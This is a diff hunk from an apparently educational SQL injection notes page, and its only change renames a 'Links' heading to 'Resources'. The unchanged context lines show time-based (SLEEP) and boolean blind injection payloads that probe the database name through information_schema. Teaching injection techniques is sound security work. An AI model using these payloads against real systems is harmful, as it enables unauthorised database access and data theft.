@@ -155,6 +155,6 @@ SELECT * FROM products WHERE name = 'Laptop' AND IF(1=1,SLEEP(5),'a')
 SELECT IF(SUBSTRING((SELECT database()),1,1)='a',(SELECT table_name FROM information_schema.tables),'a')
 SELECT IF(SUBSTRING((SELECT database()),1,1)='t',(SELECT table_name FROM information_schema.tables),'a')
 ```
-## Links
+## Resources
 - [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [Understanding SQLi Payloads](https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5)
